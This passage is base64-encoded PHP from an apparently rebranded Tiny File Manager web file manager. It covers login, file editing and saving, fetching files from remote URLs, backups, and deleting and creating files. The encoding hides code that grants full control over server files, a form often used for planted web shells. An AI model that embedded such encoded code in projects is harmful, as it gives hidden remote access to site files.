CAgICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGZvcj0iZm1fcHdkIj48P3BocCBlY2hvIGxuZygnUGFzc3dvcmQnKTsgPz48L2xhYmVsPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBjbGFzcz0iZm9ybS1jb250cm9sIiBpZD0iZm1fcHdkIiBuYW1lPSJmbV9wd2QiIHJlcXVpcmVkPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgZm1fc2hvd19tZXNzYWdlKCk7ID8+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tc3VjY2VzcyBidG4tYmxvY2sgbXQtNCIgcm9sZT0iYnV0dG9uIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBlY2hvIGxuZygnTG9naW4nKTsgPz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvb3RlciB0ZXh0LWNlbnRlciI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAmbWRhc2g7Jm1kYXNoOyAmY29weTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9Imh0dHBzOi8vdGlueWZpbGVtYW5hZ2VyLmdpdGh1Yi5pby8iIHRhcmdldD0iX2JsYW5rIiBjbGFzcz0idGV4dC1tdXRlZCIgZGF0YS12ZXJzaW9uPSI8P3BocCBlY2hvIFZFUlNJT047ID8+Ij5DQ1AgUHJvZ3JhbW1lcnM8L2E+ICZtZGFzaDsmbWRhc2g7CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvc2VjdGlvbj4KCiAgICAgICAgPD9waHAKICAgICAgICBmbV9zaG93X2Zvb3Rlcl9sb2dpbigpOwogICAgICAgIGV4aXQ7CiAgICB9Cn0KCi8vIHVwZGF0ZSByb290IHBhdGgKaWYgKCR1c2VfYXV0aCAmJiBpc3NldCgkX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bJ2xvZ2dlZCddKSkgewogICAgJHJvb3RfcGF0aCA9IGlzc2V0KCRkaXJlY3Rvcmllc191c2Vyc1skX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bJ2xvZ2dlZCddXSkgPyAkZGlyZWN0b3JpZXNfdXNlcnNbJF9TRVNTSU9OW0ZNX1NFU1NJT05fSURdWydsb2dnZWQnXV0gOiAkcm9vdF9wYXRoOwp9CgovLyBjbGVhbiBhbmQgY2hlY2sgJHJvb3RfcGF0aAokcm9vdF9wYXRoID0gcnRyaW0oJHJvb3RfcGF0aCwgJ1xcLycpOwokcm9vdF9wYXRoID0gc3RyX3JlcGxhY2UoJ1xcJywgJy8nLCAkcm9vdF9wYXRoKTsKaWYgKCFAaXNfZGlyKCRyb290X3BhdGgpKSB7CiAgICBlY2hvICI8aDE+Um9vdCBwYXRoIFwieyRyb290X3BhdGh9XCIgbm90IGZvdW5kITwvaDE+IjsKICAgIGV4aXQ7Cn0KCmRlZmluZWQoJ0ZNX1NIT1dfSElEREVOJykgfHwgZGVmaW5lKCdGTV9TSE9XX0hJRERFTicsICRzaG93X2hpZGRlbl9maWxlcyk7CmRlZmluZWQoJ0ZNX1JPT1RfUEFUSCcpIHx8IGRlZmluZSgnRk1fUk9PVF9QQVRIJywgJHJvb3RfcGF0aCk7CmRlZmluZWQoJ0ZNX0xBTkcnKSB8fCBkZWZpbmUoJ0ZNX0xBTkcnLCAkbGFuZyk7CmRlZmluZWQoJ0ZNX0ZJTEVfRVhURU5TSU9OJykgfHwgZGVmaW5lKCdGTV9GSUxFX0VYVEVOU0lPTicsICRhbGxvd2VkX2ZpbGVfZXh0ZW5zaW9ucyk7CmRlZmluZWQoJ0ZNX1VQTE9BRF9FWFRFTlNJT04nKSB8fCBkZWZpbmUoJ0ZNX1VQTE9BRF9FWFRFTlNJT04nLCAkYWxsb3dlZF91cGxvYWRfZXh0ZW5zaW9ucyk7CmRlZmluZWQoJ0ZNX0VYQ0xVREVfSVRFTVMnKSB8fCBkZWZpbmUoJ0ZNX0VYQ0xVREVfSVRFTVMnLCAkZXhjbHVkZV9pdGVtcyk7CmRlZmluZWQoJ0ZNX0RPQ19WSUVXRVInKSB8fCBkZWZpbmUoJ0ZNX0RPQ19WSUVXRVInLCAkb25saW5lX3ZpZXdlcik7CmRlZmluZSgnRk1fUkVBRE9OTFknLCAkdXNlX2F1dGggJiYgIWVtcHR5KCRyZWFkb25seV91c2VycykgJiYgaXNzZXQoJF9TRVNTSU9OW0ZNX1NFU1NJT05fSURdWydsb2dnZWQnXSkgJiYgaW5fYXJyYXkoJF9TRVNTSU9OW0ZNX1NFU1NJT05fSURdWydsb2dnZWQnXSwgJHJlYWRvbmx5X3VzZXJzKSk7CmRlZmluZSgnRk1fSVNfV0lOJywgRElSRUNUT1JZX1NFUEFSQVRPUiA9PSAnXFwnKTsKCi8vIGFsd2F5cyB1c2UgP3A9CmlmICghaXNzZXQoJF9HRVRbJ3AnXSkgJiYgZW1wdHkoJF9GSUxFUykpIHsKICAgIGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScpOwp9CgovLyBnZXQgcGF0aAokcCA9IGlzc2V0KCRfR0VUWydwJ10pID8gJF9HRVRbJ3AnXSA6IChpc3NldCgkX1BPU1RbJ3AnXSkgPyAkX1BPU1RbJ3AnXSA6ICcnKTsKCi8vIGNsZWFuIHBhdGgKJHAgPSBmbV9jbGVhbl9wYXRoKCRwKTsKCi8vIGZvciBhamF4IHJlcXVlc3QgLSBzYXZlCiRpbnB1dCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCdwaHA6Ly9pbnB1dCcpOwokX1BPU1QgPSAoc3RycG9zKCRpbnB1dCwgJ2FqYXgnKSAhPSBGQUxTRSAmJiBzdHJwb3MoJGlucHV0LCAnc2F2ZScpICE9IEZBTFNFKSA/IGpzb25fZGVjb2RlKCRpbnB1dCwgdHJ1ZSkgOiAkX1BPU1Q7CgovLyBpbnN0ZWFkIGdsb2JhbHMgdmFycwpkZWZpbmUoJ0ZNX1BBVEgnLCAkcCk7CmRlZmluZSgnRk1fVVNFX0FVVEgnLCAkdXNlX2F1dGgpOwpkZWZpbmUoJ0ZNX0VESVRfRklMRScsICRlZGl0X2ZpbGVzKTsKZGVmaW5lZCgnRk1fSUNPTlZfSU5QVVRfRU5DJykgfHwgZGVmaW5lKCdGTV9JQ09OVl9JTlBVVF9FTkMnLCAkaWNvbnZfaW5wdXRfZW5jb2RpbmcpOwpkZWZpbmVkKCdGTV9VU0VfSElHSExJR0hUSlMnKSB8fCBkZWZpbmUoJ0ZNX1VTRV9ISUdITElHSFRKUycsICR1c2VfaGlnaGxpZ2h0anMpOwpkZWZpbmVkKCdGTV9ISUdITElHSFRKU19TVFlMRScpIHx8IGRlZmluZSgnRk1fSElHSExJR0hUSlNfU1RZTEUnLCAkaGlnaGxpZ2h0anNfc3R5bGUpOwpkZWZpbmVkKCdGTV9EQVRFVElNRV9GT1JNQVQnKSB8fCBkZWZpbmUoJ0ZNX0RBVEVUSU1FX0ZPUk1BVCcsICRkYXRldGltZV9mb3JtYXQpOwoKdW5zZXQoJHAsICR1c2VfYXV0aCwgJGljb252X2lucHV0X2VuY29kaW5nLCAkdXNlX2hpZ2hsaWdodGpzLCAkaGlnaGxpZ2h0anNfc3R5bGUpOwoKLyoqKioqKioqKioqKioqKioqKioqKioqKioqKiBBQ1RJT05TICoqKioqKioqKioqKioqKioqKioqKioqKioqKi8KCi8vIEFKQVggUmVxdWVzdAppZiAoaXNzZXQoJF9QT1NUWydhamF4J10pICYmICFGTV9SRUFET05MWSkgewoKICAgIC8vIHNhdmUKICAgIGlmIChpc3NldCgkX1BPU1RbJ3R5cGUnXSkgJiYgJF9QT1NUWyd0eXBlJ10gPT0gInNhdmUiKSB7CiAgICAgICAgLy8gZ2V0IGN1cnJlbnQgcGF0aAogICAgICAgICRwYXRoID0gRk1fUk9PVF9QQVRIOwogICAgICAgIGlmIChGTV9QQVRIICE9ICcnKSB7CiAgICAgICAgICAgICRwYXRoIC49ICcvJyAuIEZNX1BBVEg7CiAgICAgICAgfQogICAgICAgIC8vIGNoZWNrIHBhdGgKICAgICAgICBpZiAoIWlzX2RpcigkcGF0aCkpIHsKICAgICAgICAgICAgZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwgLiAnP3A9Jyk7CiAgICAgICAgfQogICAgICAgICRmaWxlID0gJF9HRVRbJ2VkaXQnXTsKICAgICAgICAkZmlsZSA9IGZtX2NsZWFuX3BhdGgoJGZpbGUpOwogICAgICAgICRmaWxlID0gc3RyX3JlcGxhY2UoJy8nLCAnJywgJGZpbGUpOwogICAgICAgIGlmICgkZmlsZSA9PSAnJyB8fCAhaXNfZmlsZSgkcGF0aCAuICcvJyAuICRmaWxlKSkgewogICAgICAgICAgICBmbV9zZXRfbXNnKCdGaWxlIG5vdCBmb3VuZCcsICdlcnJvcicpOwogICAgICAgICAgICBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICc/cD0nIC4gdXJsZW5jb2RlKEZNX1BBVEgpKTsKICAgICAgICB9CiAgICAgICAgaGVhZGVyKCdYLVhTUy1Qcm90ZWN0aW9uOjAnKTsgCiAgICAgICAgJGZpbGVfcGF0aCA9ICRwYXRoIC4gJy8nIC4gJGZpbGU7CiAgICAgICAgCiAgICAgICAgJHdyaXRlZGF0YSA9ICRfUE9TVFsnY29udGVudCddOwogICAgICAgICRmZCA9IGZvcGVuKCRmaWxlX3BhdGgsICJ3Iik7CiAgICAgICAgJHdyaXRlX3Jlc3VsdHMgPSBAZndyaXRlKCRmZCwgJHdyaXRlZGF0YSk7CiAgICAgICAgZmNsb3NlKCRmZCk7CiAgICAgICAgaWYgKCR3cml0ZV9yZXN1bHRzID09PSBmYWxzZSl7IAogICAgICAgICAgICBoZWFkZXIoIkhUVFAvMS4xIDUwMCBJbnRlcm5hbCBTZXJ2ZXIgRXJyb3IiKTsKICAgICAgICAgICAgZGllKCJDb3VsZCBOb3QgV3JpdGUgRmlsZSEgLSBDaGVjayBQZXJtaXNzaW9ucyAvIE93bmVyc2hpcCIpOwogICAgICAgIH0KICAgICAgICBkaWUodHJ1ZSk7CiAgICB9CgogICAgLy9zZWFyY2ggOiBnZXQgbGlzdCBvZiBmaWxlcyBmcm9tIHRoZSBjdXJyZW50IGZvbGRlcgogICAgaWYoaXNzZXQoJF9QT1NUWyd0eXBlJ10pICYmICRfUE9TVFsndHlwZSddPT0ic2VhcmNoIikgewogICAgICAgICRkaXIgPSBGTV9ST09UX1BBVEg7CiAgICAgICAgJHJlc3BvbnNlID0gc2NhbihmbV9jbGVhbl9wYXRoKCRfUE9TVFsncGF0aCddKSwgJF9QT1NUWydjb250ZW50J10pOwogICAgICAgIGVjaG8ganNvbl9lbmNvZGUoJHJlc3BvbnNlKTsKICAgICAgICBleGl0KCk7CiAgICB9CiAgICAKICAgIC8vIGJhY2t1cCBmaWxlcwogICAgaWYgKGlzc2V0KCRfUE9TVFsndHlwZSddKSAmJiAkX1BPU1RbJ3R5cGUnXSA9PSAiYmFja3VwIiAmJiAhZW1wdHkoJF9QT1NUWydmaWxlJ10pKSB7CiAgICAgICAgJGZpbGVOYW1lID0gJF9QT1NUWydmaWxlJ107CiAgICAgICAgJGZ1bGxQYXRoID0gRk1fUk9PVF9QQVRIIC4gJy8nOwogICAgICAgIGlmICghZW1wdHkoJF9QT1NUWydwYXRoJ10pKSB7CiAgICAgICAgICAgICRyZWxhdGl2ZURpclBhdGggPSBmbV9jbGVhbl9wYXRoKCRfUE9TVFsncGF0aCddKTsKICAgICAgICAgICAgJGZ1bGxQYXRoIC49ICJ7JHJlbGF0aXZlRGlyUGF0aH0vIjsKICAgICAgICB9CiAgICAgICAgJGRhdGUgPSBkYXRlKCJkTXktSGlzIik7CiAgICAgICAgJG5ld0ZpbGVOYW1lID0gInskZmlsZU5hbWV9LXskZGF0ZX0uYmFrIjsKICAgICAgICAkZnVsbHlRdWFsaWZpZWRGaWxlTmFtZSA9ICRmdWxsUGF0aCAuICRmaWxlTmFtZTsKICAgICAgICB0cnkgewogICAgICAgICAgICBpZiAoIWZpbGVfZXhpc3RzKCRmdWxseVF1YWxpZmllZEZpbGVOYW1lKSkgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigiRmlsZSB7JGZpbGVOYW1lfSBub3QgZm91bmQiKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoY29weSgkZnVsbHlRdWFsaWZpZWRGaWxlTmFtZSwgJGZ1bGxQYXRoIC4gJG5ld0ZpbGVOYW1lKSkgewogICAgICAgICAgICAgICAgZWNobyAiQmFja3VwIHskbmV3RmlsZU5hbWV9IGNyZWF0ZWQiOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigiQ291bGQgbm90IGNvcHkgZmlsZSB7JGZpbGVOYW1lfSIpOwogICAgICAgICAgICB9CiAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uICRlKSB7CiAgICAgICAgICAgIGVjaG8gJGUtPmdldE1lc3NhZ2UoKTsKICAgICAgICB9CiAgICB9CgogICAgLy8gU2F2ZSBDb25maWcKICAgIGlmIChpc3NldCgkX1BPU1RbJ3R5cGUnXSkgJiYgJF9QT1NUWyd0eXBlJ10gPT0gInNldHRpbmdzIikgewogICAgICAgIGdsb2JhbCAkY2ZnLCAkbGFuZywgJHJlcG9ydF9lcnJvcnMsICRzaG93X2hpZGRlbl9maWxlcywgJGxhbmdfbGlzdCwgJGhpZGVfQ29scywgJGNhbGNfZm9sZGVyOwogICAgICAgICRuZXdMbmcgPSAkX1BPU1RbJ2pzLWxhbmd1YWdlJ107CiAgICAgICAgZm1fZ2V0X3RyYW5zbGF0aW9ucyhbXSk7CiAgICAgICAgaWYgKCFhcnJheV9rZXlfZXhpc3RzKCRuZXdMbmcsICRsYW5nX2xpc3QpKSB7CiAgICAgICAgICAgICRuZXdMbmcgPSAnZW4nOwogICAgICAgIH0KCiAgICAgICAgJGVycCA9IGlzc2V0KCRfUE9TVFsnanMtZXJyb3ItcmVwb3J0J10pICYmICRfUE9TVFsnanMtZXJyb3ItcmVwb3J0J10gPT0gInRydWUiID8gdHJ1ZSA6IGZhbHNlOwogICAgICAgICRzaGYgPSBpc3NldCgkX1BPU1RbJ2pzLXNob3ctaGlkZGVuJ10pICYmICRfUE9TVFsnanMtc2hvdy1oaWRkZW4nXSA9PSAidHJ1ZSIgPyB0cnVlIDogZmFsc2U7CiAgICAgICAgJGhjbyA9IGlzc2V0KCRfUE9TVFsnanMtaGlkZS1jb2xzJ10pICYmICRfUE9TVFsnanMtaGlkZS1jb2xzJ10gPT0gInRydWUiID8gdHJ1ZSA6IGZhbHNlOwogICAgICAgICRjYWYgPSBpc3NldCgkX1BPU1RbJ2pzLWNhbGMtZm9sZGVyJ10pICYmICRfUE9TVFsnanMtY2FsYy1mb2xkZXInXSA9PSAidHJ1ZSIgPyB0cnVlIDogZmFsc2U7CgogICAgICAgIGlmICgkY2ZnLT5kYXRhWydsYW5nJ10gIT0gJG5ld0xuZykgewogICAgICAgICAgICAkY2ZnLT5kYXRhWydsYW5nJ10gPSAkbmV3TG5nOwogICAgICAgICAgICAkbGFuZyA9ICRuZXdMbmc7CiAgICAgICAgfQogICAgICAgIGlmICgkY2ZnLT5kYXRhWydlcnJvcl9yZXBvcnRpbmcnXSAhPSAkZXJwKSB7CiAgICAgICAgICAgICRjZmctPmRhdGFbJ2Vycm9yX3JlcG9ydGluZyddID0gJGVycDsKICAgICAgICAgICAgJHJlcG9ydF9lcnJvcnMgPSAkZXJwOwogICAgICAgIH0KICAgICAgICBpZiAoJGNmZy0+ZGF0YVsnc2hvd19oaWRkZW4nXSAhPSAkc2hmKSB7CiAgICAgICAgICAgICRjZmctPmRhdGFbJ3Nob3dfaGlkZGVuJ10gPSAkc2hmOwogICAgICAgICAgICAkc2hvd19oaWRkZW5fZmlsZXMgPSAkc2hmOwogICAgICAgIH0KICAgICAgICBpZiAoJGNmZy0+ZGF0YVsnc2hvd19oaWRkZW4nXSAhPSAkc2hmKSB7CiAgICAgICAgICAgICRjZmctPmRhdGFbJ3Nob3dfaGlkZGVuJ10gPSAkc2hmOwogICAgICAgICAgICAkc2hvd19oaWRkZW5fZmlsZXMgPSAkc2hmOwogICAgICAgIH0KICAgICAgICBpZiAoJGNmZy0+ZGF0YVsnaGlkZV9Db2xzJ10gIT0gJGhjbykgewogICAgICAgICAgICAkY2ZnLT5kYXRhWydoaWRlX0NvbHMnXSA9ICRoY287CiAgICAgICAgICAgICRoaWRlX0NvbHMgPSAkaGNvOwogICAgICAgIH0KICAgICAgICBpZiAoJGNmZy0+ZGF0YVsnY2FsY19mb2xkZXInXSAhPSAkY2FmKSB7CiAgICAgICAgICAgICRjZmctPmRhdGFbJ2NhbGNfZm9sZGVyJ10gPSAkY2FmOwogICAgICAgICAgICAkY2FsY19mb2xkZXIgPSAkY2FmOwogICAgICAgIH0KICAgICAgICAkY2ZnLT5zYXZlKCk7CiAgICAgICAgZWNobyB0cnVlOwogICAgfQoKICAgIC8vIG5ldyBwYXNzd29yZCBoYXNoCiAgICBpZiAoaXNzZXQoJF9QT1NUWyd0eXBlJ10pICYmICRfUE9TVFsndHlwZSddID09ICJwd2RoYXNoIikgewogICAgICAgICRyZXMgPSBpc3NldCgkX1BPU1RbJ2lucHV0UGFzc3dvcmQyJ10pICYmICFlbXB0eSgkX1BPU1RbJ2lucHV0UGFzc3dvcmQyJ10pID8gcGFzc3dvcmRfaGFzaCgkX1BPU1RbJ2lucHV0UGFzc3dvcmQyJ10sIFBBU1NXT1JEX0RFRkFVTFQpIDogJyc7CiAgICAgICAgZWNobyAkcmVzOwogICAgfQoKICAgIC8vdXBsb2FkIHVzaW5nIHVybAogICAgaWYoaXNzZXQoJF9QT1NUWyd0eXBlJ10pICYmICRfUE9TVFsndHlwZSddID09ICJ1cGxvYWQiICYmICFlbXB0eSgkX1JFUVVFU1RbInVwbG9hZHVybCJdKSkgewogICAgICAgICRwYXRoID0gRk1fUk9PVF9QQVRIOwogICAgICAgIGlmIChGTV9QQVRIICE9ICcnKSB7CiAgICAgICAgICAgICRwYXRoIC49ICcvJyAuIEZNX1BBVEg7CiAgICAgICAgfQoKICAgICAgICAkdXJsID0gIWVtcHR5KCRfUkVRVUVTVFsidXBsb2FkdXJsIl0pICYmIHByZWdfbWF0Y2goInxeaHR0cChzKT86Ly8uKyR8Iiwgc3RyaXBzbGFzaGVzKCRfUkVRVUVTVFsidXBsb2FkdXJsIl0pKSA/IHN0cmlwc2xhc2hlcygkX1JFUVVFU1RbInVwbG9hZHVybCJdKSA6IG51bGw7CiAgICAgICAgJHVzZV9jdXJsID0gZmFsc2U7CiAgICAgICAgJHRlbXBfZmlsZSA9IHRlbXBuYW0oc3lzX2dldF90ZW1wX2RpcigpLCAidXBsb2FkLSIpOwogICAgICAgICRmaWxlaW5mbyA9IG5ldyBzdGRDbGFzcygpOwogICAgICAgICRmaWxlaW5mby0+bmFtZSA9IHRyaW0oYmFzZW5hbWUoJHVybCksICIuXHgwMC4uXHgyMCIpOwoKICAgICAgICAkYWxsb3dlZCA9IChGTV9VUExPQURfRVhURU5TSU9OKSA/IGV4cGxvZGUoJywnLCBGTV9VUExPQURfRVhURU5TSU9OKSA6IGZhbHNlOwogICAgICAgICRleHQgPSBzdHJ0b2xvd2VyKHBhdGhpbmZvKCRmaWxlaW5mby0+bmFtZSwgUEFUSElORk9fRVhURU5TSU9OKSk7CiAgICAgICAgJGlzRmlsZUFsbG93ZWQgPSAoJGFsbG93ZWQpID8gaW5fYXJyYXkoJGV4dCwgJGFsbG93ZWQpIDogdHJ1ZTsKICAgICAgICAKICAgICAgICBmdW5jdGlvbiBldmVudF9jYWxsYmFjayAoJG1lc3NhZ2UpIHsKICAgICAgICAgICAgZ2xvYmFsICRjYWxsYmFjazsKICAgICAgICAgICAgZWNobyBqc29uX2VuY29kZSgkbWVzc2FnZSk7CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBnZXRfZmlsZV9wYXRoICgpIHsKICAgICAgICAgICAgZ2xvYmFsICRwYXRoLCAkZmlsZWluZm8sICR0ZW1wX2ZpbGU7CiAgICAgICAgICAgIHJldHVybiAkcGF0aC4iLyIuYmFzZW5hbWUoJGZpbGVpbmZvLT5uYW1lKTsKICAgICAgICB9CgogICAgICAgICRlcnIgPSBmYWxzZTsKCiAgICAgICAgaWYoISRpc0ZpbGVBbGxvd2VkKSB7CiAgICAgICAgICAgICRlcnIgPSBhcnJheSgibWVzc2FnZSIgPT4gIkZpbGUgZXh0ZW5zaW9uIGlzIG5vdCBhbGxvd2VkIik7CiAgICAgICAgICAgIGV2ZW50X2NhbGxiYWNrKGFycmF5KCJmYWlsIiA9PiAkZXJyKSk7CiAgICAgICAgICAgIGV4aXQoKTsKICAgICAgICB9CgogICAgICAgIGlmICghJHVybCkgewogICAgICAgICAgICAkc3VjY2VzcyA9IGZhbHNlOwogICAgICAgIH0gZWxzZSBpZiAoJHVzZV9jdXJsKSB7CiAgICAgICAgICAgIEAkZnAgPSBmb3BlbigkdGVtcF9maWxlLCAidyIpOwogICAgICAgICAgICBAJGNoID0gY3VybF9pbml0KCR1cmwpOwogICAgICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfTk9QUk9HUkVTUywgZmFsc2UgKTsKICAgICAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCB0cnVlKTsKICAgICAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZJTEUsICRmcCk7CiAgICAgICAgICAgIEAkc3VjY2VzcyA9IGN1cmxfZXhlYygkY2gpOwogICAgICAgICAgICAkY3VybF9pbmZvID0gY3VybF9nZXRpbmZvKCRjaCk7CiAgICAgICAgICAgIGlmICghJHN1Y2Nlc3MpIHsKICAgICAgICAgICAgICAgICRlcnIgPSBhcnJheSgibWVzc2FnZSIgPT4gY3VybF9lcnJvcigkY2gpKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBAY3VybF9jbG9zZSgkY2gpOwogICAgICAgICAgICBmY2xvc2UoJGZwKTsKICAgICAgICAgICAgJGZpbGVpbmZvLT5zaXplID0gJGN1cmxfaW5mb1sic2l6ZV9kb3dubG9hZCJdOwogICAgICAgICAgICAkZmlsZWluZm8tPnR5cGUgPSAkY3VybF9pbmZvWyJjb250ZW50X3R5cGUiXTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkY3R4ID0gc3RyZWFtX2NvbnRleHRfY3JlYXRlKCk7CiAgICAgICAgICAgIEAkc3VjY2VzcyA9IGNvcHkoJHVybCwgJHRlbXBfZmlsZSwgJGN0eCk7CiAgICAgICAgICAgIGlmICghJHN1Y2Nlc3MpIHsKICAgICAgICAgICAgICAgICRlcnIgPSBlcnJvcl9nZXRfbGFzdCgpOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBpZiAoJHN1Y2Nlc3MpIHsKICAgICAgICAgICAgJHN1Y2Nlc3MgPSByZW5hbWUoJHRlbXBfZmlsZSwgZ2V0X2ZpbGVfcGF0aCgpKTsKICAgICAgICB9CgogICAgICAgIGlmICgkc3VjY2VzcykgewogICAgICAgICAgICBldmVudF9jYWxsYmFjayhhcnJheSgiZG9uZSIgPT4gJGZpbGVpbmZvKSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgdW5saW5rKCR0ZW1wX2ZpbGUpOwogICAgICAgICAgICBpZiAoISRlcnIpIHsKICAgICAgICAgICAgICAgICRlcnIgPSBhcnJheSgibWVzc2FnZSIgPT4gIkludmFsaWQgdXJsIHBhcmFtZXRlciIpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGV2ZW50X2NhbGxiYWNrKGFycmF5KCJmYWlsIiA9PiAkZXJyKSk7CiAgICAgICAgfQogICAgfQoKICAgIGV4aXQoKTsKfQoKLy8gRGVsZXRlIGZpbGUgLyBmb2xkZXIKaWYgKGlzc2V0KCRfR0VUWydkZWwnXSkgJiYgIUZNX1JFQURPTkxZKSB7CiAgICAkZGVsID0gc3RyX3JlcGxhY2UoICcvJywgJycsIGZtX2NsZWFuX3BhdGgoICRfR0VUWydkZWwnXSApICk7CiAgICBpZiAoJGRlbCAhPSAnJyAmJiAkZGVsICE9ICcuLicgJiYgJGRlbCAhPSAnLicpIHsKICAgICAgICAkcGF0aCA9IEZNX1JPT1RfUEFUSDsKICAgICAgICBpZiAoRk1fUEFUSCAhPSAnJykgewogICAgICAgICAgICAkcGF0aCAuPSAnLycgLiBGTV9QQVRIOwogICAgICAgIH0KICAgICAgICAkaXNfZGlyID0gaXNfZGlyKCRwYXRoIC4gJy8nIC4gJGRlbCk7CiAgICAgICAgaWYgKGZtX3JkZWxldGUoJHBhdGggLiAnLycgLiAkZGVsKSkgewogICAgICAgICAgICAkbXNnID0gJGlzX2RpciA/ICdGb2xkZXIgPGI+JXM8L2I+IGRlbGV0ZWQnIDogJ0ZpbGUgPGI+JXM8L2I+IGRlbGV0ZWQnOwogICAgICAgICAgICBmbV9zZXRfbXNnKHNwcmludGYoJG1zZywgZm1fZW5jKCRkZWwpKSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJG1zZyA9ICRpc19kaXIgPyAnRm9sZGVyIDxiPiVzPC9iPiBub3QgZGVsZXRlZCcgOiAnRmlsZSA8Yj4lczwvYj4gbm90IGRlbGV0ZWQnOwogICAgICAgICAgICBmbV9zZXRfbXNnKHNwcmludGYoJG1zZywgZm1fZW5jKCRkZWwpKSwgJ2Vycm9yJyk7CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICBmbV9zZXRfbXNnKCdJbnZhbGlkIGZpbGUgb3IgZm9sZGVyIG5hbWUnLCAnZXJyb3InKTsKICAgIH0KICAgIGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScgLiB1cmxlbmNvZGUoRk1fUEFUSCkpOwp9CgovLyBDcmVhdGUgZm9sZGVyCmlmIChpc3NldCgkX0dFVFsnbmV3J10pICYmIGlzc2V0KCRfR0VUWyd0eXBlJ10pICYmICFGTV9SRUFET05MWSkgewogICAgJHR5cGUgPSAkX0dFVFsndHlwZSddOwogICAgJG5ldyA9IHN0cl9yZXBsYWNlKCAnLycsICcnLCBmbV9jbGVhbl9wYXRoKCBzdHJpcF90YWdzKCAkX0dFVFsnbmV3J10gKSApICk7CiAgICBpZiAoZm1faXN2YWxpZF9maWxlbmFtZSgkbmV3KSAmJiAkbmV3ICE9ICcnICYmICRuZXcgIT0gJy4uJyAmJiAkbmV3ICE9ICcuJykgewogICAgICAgICRwYXRoID0gRk1fUk9PVF9QQVRIOwogICAgICAgIGlmIChGTV9QQVRIICE9ICcnKSB7CiAgICAgICAgICAgICRwYXRoIC49ICcvJyAuIEZNX1BBVEg7CiAgICAgICAgfQogICAgICAgIGlmICgkX0dFVFsndHlwZSddID09ICJmaWxlIikgewogICAgICAgICAgICBpZiAoIWZpbGVfZXhpc3RzKCRwYXRoIC4gJy8nIC4gJG5ldykpIHsKICAgICAgICAgICAgICAgIGlmKGZtX2lzX3ZhbGlkX2V4dCgkbmV3KSkgewogICAgICAgICAgICAgICAgICAgIEBmb3BlbigkcGF0aCAuICcvJyAuICRuZXcsICd3Jykgb3IgZGllKCdDYW5ub3Qgb3BlbiBmaWxlOiAgJyAuICRuZXcpOwogICAgICAgICAgICAgICAgICAgIGZtX3NldF9tc2coc3ByaW50ZihsbmcoJ0ZpbGUnKS4nIDxiPiVzPC9iPiAnLmxuZygnQ3JlYXRlZCcpLCBmbV9lbmMoJG5ldykpKTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgZm1fc2V0X21zZygnRmlsZSBleHRlbnNpb24gaXMgbm90IGFsbG93ZWQnLCAnZXJyb3InKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGZtX3NldF9tc2coc3ByaW50ZignRmlsZSA8Yj4